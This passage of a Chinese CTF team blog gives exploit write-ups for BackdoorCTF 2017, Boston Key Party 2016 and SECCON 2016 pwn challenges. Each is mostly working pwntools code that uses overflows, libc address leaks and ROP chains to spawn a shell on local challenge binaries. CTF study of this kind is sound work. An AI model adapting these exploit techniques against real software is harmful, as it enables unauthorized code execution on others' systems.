class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000045e790) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000004004b8) # syscall</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Password&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="BackdoorCTF-2017-just-do-it"><a href="#BackdoorCTF-2017-just-do-it" class="headerlink" title="BackdoorCTF 2017-just do it"></a>BackdoorCTF 2017-just do it</h3><p>这个题我也是遇到了和之前especially_good_jmps一样的困扰，缓冲区没有清空，无法利用read函数将’sh’读到指定data段，后来想到再leak出地址后可以利用fflsh函数清空一次缓冲区，然后再读入’sh’即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;32_chal&#39;)</span><br><span class="line"></span><br><span class="line">pop_esi &#x3D; 0x0804853d</span><br><span class="line">main_addr &#x3D; 0x0804847D</span><br><span class="line">got &#x3D; 0x0804A00C</span><br><span class="line">write_plt &#x3D; 0x08048370</span><br><span class="line">data_addr &#x3D; 0x0804A020</span><br><span class="line">read_plt &#x3D; 0x08048330</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p32(write_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(got)</span><br><span class="line">payload +&#x3D; p32(4)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Hello pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">function &#x3D; &#39;read&#39;</span><br><span class="line">da &#x3D; u32(p.recvuntil(&#39;H&#39;)[1:5])</span><br><span class="line">addr &#x3D; da</span><br><span class="line">base_addr &#x3D; addr - libc32.sym[function]</span><br><span class="line">sys_addr &#x3D; base_addr + libc32.sym[&#39;system&#39;]</span><br><span class="line">gets_addr &#x3D; base_addr + libc32.sym[&#39;gets&#39;]</span><br><span class="line">fflush_addr &#x3D; base_addr + libc32.sym[&#39;fflush&#39;]</span><br><span class="line">print(hex(base_addr))</span><br><span class="line">print(hex(sys_addr))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x68</span><br><span class="line">payload +&#x3D; p32(fflush_addr)  #use the fflush to make the read function works</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x70</span><br><span class="line">payload +&#x3D; p32(read_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line">payload +&#x3D; p32(5)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(1)</span><br><span class="line">p.sendline(&#39;sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 0x68</span><br><span class="line">payload +&#x3D; p32(sys_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;pwners, \n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h3 id="boston-key-party-2016-simple-calc"><a href="#boston-key-party-2016-simple-calc" class="headerlink" title="boston key party 2016-simple calc"></a>boston key party 2016-simple calc</h3><p>这题其实本身挺简单，也是个静态编译，不过输入需要判断，简单写个判断函数就行，只是一开始懒得自己码代码，想去看看别的dalao怎么做，结果看有的exp一个一个字节手动构造，给我看傻了，遂还是自己写了2333，注意四个字节一个数字，分情况用加，减，乘三种拆分即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">p &#x3D; process(&#39;simple_calc&#39;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def SEND(number, A1, A2):</span><br><span class="line">    p.recvuntil(&#39;&#x3D;&gt; &#39;)</span><br><span class="line">    p.sendline(str(number))</span><br><span class="line">    p.recvuntil(&#39;Integer x:&#39;)</span><br><span class="line">    p.sendline(str(A1))</span><br><span class="line">    p.recvuntil(&#39;Integer y:&#39;)</span><br><span class="line">    p.sendline(str(A2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_factor(number):</span><br><span class="line">    for i in range(40, (int)(math.sqrt(number))):</span><br><span class="line">        if number % i &#x3D;&#x3D; 0:</span><br><span class="line">            return i, number&#x2F;i</span><br><span class="line">    return 0, 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;0&#39; * 0x30</span><br><span class="line">payload +&#x3D; p64(0)                         # the parameter of free would be covered by this</span><br><span class="line">payload &#x3D; payload.ljust(0x48, &quot;\x00&quot;)     # let the program conntinue, use the null</span><br><span class="line"></span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401c87) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1060) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000044db34) # pop rax ; ret</span><br><span class="line">payload +&#x3D; &#39;&#x2F;bin&#x2F;&#x2F;sh&#39;</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401c87) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1068) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041c61f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000470f11) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401b73) # pop rdi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1060) # @ .data</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000401c87) # pop rsi ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1068) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000437a85) # pop rdx ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x00000000006c1068) # @ .data + 8</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x000000000041c61f) # xor rax, rax ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000463b90) # add rax, 1 ; ret</span><br><span class="line">payload +&#x3D; pack(&#39;&lt;Q&#39;, 0x0000000000400488) # syscall</span><br><span class="line"></span><br><span class="line">len &#x3D; len(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;calculations:&#39;)</span><br><span class="line">p.sendline(str(len&#x2F;4 + 1))</span><br><span class="line"></span><br><span class="line">for i in range(len&#x2F;4):                    # make the ropchain works</span><br><span class="line">    x &#x3D; u32(payload[i * 4: (i+1) * 4])</span><br><span class="line">    if x &gt; 80 and x &lt; 2 ** 31:</span><br><span class="line">        if x % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            a1 &#x3D; x&#x2F;2</span><br><span class="line">            a2 &#x3D; x&#x2F;2</span><br><span class="line">        else:</span><br><span class="line">            a1 &#x3D; (x+1)&#x2F;2</span><br><span class="line">            a2 &#x3D; (x-1)&#x2F;2</span><br><span class="line">        SEND(1, a1, a2)</span><br><span class="line">    elif x &lt; 80:</span><br><span class="line">        a1 &#x3D; x + 0x28</span><br><span class="line">        a2 &#x3D; 0x28</span><br><span class="line">        SEND(2, a1, a2)</span><br><span class="line">    else:</span><br><span class="line">        a1, a2 &#x3D; get_factor(x)</span><br><span class="line">        SEND(3, a1, a2)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;&#x3D;&gt; &#39;)</span><br><span class="line">#pause()</span><br><span class="line">p.sendline(&#39;5&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h3 id="Seccon-CTF-2016-cheer-msg"><a href="#Seccon-CTF-2016-cheer-msg" class="headerlink" title="Seccon CTF 2016-cheer msg"></a>Seccon CTF 2016-cheer msg</h3><p>这个题属实恶心了我好久，一开始找不到洞怎么用，我傻傻的一直没有点开alloca函数，天真的以为那是个库函数，结果后来发现这就是个sub esp, eax， 然后就想到了用负数来让message函数的栈和主函数重合，来溢出，注意的是这里的canary就是个摆设，只有message函数有，主函数没有。<br>然而这只是恶心的开始，然后我就看着message函数的开始是sub esp, 0x68，就想着本身会抬高0x68，一直用这个数据算，结果怎么都拿不到shell，后来看了别的dalao写的exp，自己好好动调了一下，发现总共会抬升0x70，果然凡事别太自信，不行就动调。。。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p &#x3D; process(&#39;cheer_msg&#39;)</span><br><span class="line"></span><br><span class="line">main_addr &#x3D; 0x080485CA</span><br><span class="line">printf_plt &#x3D; 0x08048430</span><br><span class="line">printf_got &#x3D; 0x0804A010</span><br><span class="line">format_addr &#x3D; 0x08048888</span><br><span class="line">data_addr &#x3D; 0x0804A030</span><br><span class="line"></span><br><span class="line">length &#x3D; -0x70                              # the real offset should debug by yourself</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Length &gt;&gt; &#39;)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; p32(printf_plt)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(printf_got)</span><br><span class="line">payload +&#x3D; p32(format_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Name &gt;&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Message :&#39;)</span><br><span class="line">printf_addr &#x3D; u32(p.recvuntil(&#39;Hello&#39;)[2: 6])</span><br><span class="line">base_addr &#x3D; printf_addr - libc32.sym[&#39;printf&#39;]</span><br><span class="line">gets_addr &#x3D; base_addr + libc32.sym[&#39;gets&#39;]</span><br><span class="line">sys_addr &#x3D; base_addr + libc32.sym[&#39;system&#39;]</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Length &gt;&gt; &#39;)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; p32(gets_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Name &gt;&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;sh&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39; * 32</span><br><span class="line">payload +&#x3D; p32(sys_addr)</span><br><span class="line">payload +&#x3D; p32(main_addr)</span><br><span class="line">payload +&#x3D; p32(data_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Length &gt;&gt; &#39;)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Name &gt;&gt; &#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>大概就先写这些吧，最近刚开学，课内压力还不大，趁这个机会好好补补pwn，然而估计TSCTF还是会划水2333，保研要紧保研要紧~</p>

        </div>
        
        
        
    </div>
</div>








</div>
                




<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
    
        
<div class="card widget">
    <div class="card-content">
        <nav class="level">
            <div class="level-item has-text-centered" style="flex-shrink: 1">
                <div>
                    
                    <figure class="image is-128x128 has-mb-6">
                        <img class="is-rounded" src="/images/avatar.png" alt="Merak">
                    </figure>
                    
                    <p class="is-size-4 is-block">
                        Merak
                    </p>
                    
                    
                    <p class="is-size-6 is-block">
                        CTF team
                    </p>
                    
                    
                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
                        <i class="fas fa-map-marker-alt has-mr-7"></i>
                        <span>Beijing</span>
                    </p>
                    
                </div>
            </div>
        </nav>
        <nav class="level is-mobile">
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        文章
                    </p>
                    <a href="/archives">
                        <p class="title has-text-weight-normal">
                            8
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        分类
                    </p>
                    <a href="/categories">
                        <p class="title has-text-weight-normal">
                            3
                        </p>
                    </a>
                </div>
            </div>
            <div class="level-item has-text-centered is-marginless">
                <div>
                    <p class="heading">
                        标签
                    </p>
                    <a href="/tags">
                        <p class="title has-text-weight-normal">
                            6
                        </p>
                    </a>
                </div>
            </div>
        </nav>
        
        <div class="level">
            <a class="level-item button is-link is-rounded" href="https://github.com/BuptMerak" target="_blank" rel="noopener">
                关注我</a>
        </div>
        
        
        
        <div class="level is-mobile">
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="Github" href="https://github.com/BuptMerak">
                
                <i class="fab fa-github"></i>
                
            </a>
            
            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
                title="RSS" href="/atom.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
            
        </div>
        
    </div>
</div>
    
        <div class="card widget">
    <div class="card-content">
        <div class="menu">
        <h3 class="menu-label">
            链接
        </h3>
        <ul class="menu-list">
        
            <li>
                <a class="level is-mobile" href="https://ieki.xyz" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Eki</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">ieki.xyz</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="http://www.duanyufi.com" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Du@nYuFi</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">www.duanyufi.com</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://blog.csdn.net/crisprx" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Crisprx</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">blog.csdn.net</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="http://www.zhaobairen.club" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Retr_0</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">www.zhaobairen.club</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://me.csdn.net/Zarcs_233" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Rimao</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">me.csdn.net</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="https://lordriot.live/" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">LordRiot</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">lordriot.live</span>
                    </span>
                </a>
            </li>
        
            <li>
                <a class="level is-mobile" href="http://www.arklight.xyz/" target="_blank" rel="noopener">
                    <span class="level-left">
                        <span class="level-item">Arklight</span>
                    </span>
                    <span class="level-right">
                        <span class="level-item tag">www.arklight.xyz</span>
                    </span>
                </a>
            </li>
        
        </ul>
        </div>
    </div>
</div>

    
        
<div class="card widget">
    <div class="card-content">
        <div class="menu">
            <h3 class="menu-label">
                分类
            </h3>
            <ul class="menu-list">
            <li>
        <a class="level is-marginless" href="/categories/Pwn/">
            <span class="level-start">
                <span class="level-item">Pwn</span>
            </span>
            <span class="level-end">
